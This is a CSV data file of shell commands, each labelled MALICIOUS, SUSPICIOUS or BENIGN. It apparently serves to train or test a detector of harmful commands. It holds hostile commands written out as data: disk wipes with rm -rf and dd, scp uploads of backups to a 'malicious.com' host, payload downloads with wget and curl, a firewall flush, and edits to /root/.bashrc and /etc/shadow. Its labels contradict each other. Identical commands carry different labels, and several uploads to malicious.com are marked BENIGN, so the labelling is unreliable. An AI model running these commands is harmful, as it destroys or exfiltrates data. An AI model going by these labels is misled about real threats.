command,label
rm -rf /* --no-preserve-root,MALICIOUS
ps aux | grep nginx,MALICIOUS
sudo apt install net-tools ,BENIGN
ls   /var/www,BENIGN
cd /var/www,SUSPICIOUS
echo 'hello',BENIGN
scp backup.sql root@malicious.com:/root/,MALICIOUS
cd /tmp/,MALICIOUS
curl http://unknown.site/script.sh,SUSPICIOUS
ENV,SUSPICIOUS
cat /home/user/info.txt,BENIGN
cat homework.txt,BENIGN
mv /bin/bash /tmp/bash,MALICIOUS
ls /var/www,MALICIOUS
 history,SUSPICIOUS
ECHO 'MALWARE' > /TMP/MALWARE.SH,MALICIOUS
wget http://suspicious.org/exploit.zip,MALICIOUS
scp file.txt   root@backup.server:/var/www,MALICIOUS
iptables -F,MALICIOUS
chmod 777 /var/log/syslog,SUSPICIOUS
ps aux,SUSPICIOUS
wget http://malicious.com/payload.sh,MALICIOUS
scp file.txt attacker@remote:/tmp/,MALICIOUS
cat /root/.bashrc,SUSPICIOUS
echo 'hacked' >> /root/.bashrc ,MALICIOUS
cat   /root/.bashrc,SUSPICIOUS
ifconfig,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS
df -h,BENIGN
 dd if=/dev/zero of=/dev/sda,MALICIOUS
GREP   'PASSWORD' /ETC/PASSWD,MALICIOUS
cat readme.md,BENIGN
cat /etc/passwd,MALICIOUS
scp data.tar.gz admin@malicious.com:/var/www,MALICIOUS
SCP FILE.TXT   ROOT@MALICIOUS.COM:/TMP/,BENIGN
cat .bashrc,BENIGN
pwd,BENIGN
WHOAMI,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS
uname -a,SUSPICIOUS
curl https://safe-site.org/update.sh,BENIGN
echo 'hacked' >> /var/log/syslog,MALICIOUS
echo 'malware' > /tmp/malware.sh,MALICIOUS
sudo apt install net-tools,SUSPICIOUS
ls /tmp/,BENIGN
UNAME -A,SUSPICIOUS
history,SUSPICIOUS
netstat -tulnp,SUSPICIOUS
cat /home/user/todo.txt,BENIGN
curl https://fileshare.com/exploit.zip,SUSPICIOUS
CAT NOTES.TXT,BENIGN
rm -rf /var/,SUSPICIOUS
cat welcome.txt,BENIGN
echo   'hello',BENIGN
wget http://suspicious.org/update.bin,MALICIOUS
cat /etc/passwd ,MALICIOUS
sudo -l,SUSPICIOUS
cat   welcome.txt,BENIGN
ping google.com,BENIGN
curl -O http://suspicious.org/update.bin,SUSPICIOUS
top -n 1,BENIGN
scp data.tar.gz root@malicious.com:/tmp/,BENIGN
ps aux | grep sshd,MALICIOUS
 mkdir test,BENIGN
SUDO SU,SUSPICIOUS
env,SUSPICIOUS
echo 'pwned' >>   /root/.bashrc,MALICIOUS
curl -O http://malicious.com/malware.bin,MALICIOUS
cat welcome.txt ,BENIGN
rm -rf   /var/,MALICIOUS
sudo su,SUSPICIOUS
which python ,SUSPICIOUS
grep root /etc/passwd,SUSPICIOUS
scp backup.sql root@backup.server:/root/,MALICIOUS
curl -o   http://evil.com/update.bin,SUSPICIOUS
DF -H,BENIGN
wget http://suspicious.org/payload.sh,MALICIOUS
ps   aux,SUSPICIOUS
rm -rf /home/user,SUSPICIOUS
echo 'hello world',BENIGN
rm -rf   /home/user,MALICIOUS
sudo apt install nmap ,SUSPICIOUS
curl -O http://fileshare.com/update.bin,BENIGN
echo 'owned' > /etc/shadow,SUSPICIOUS
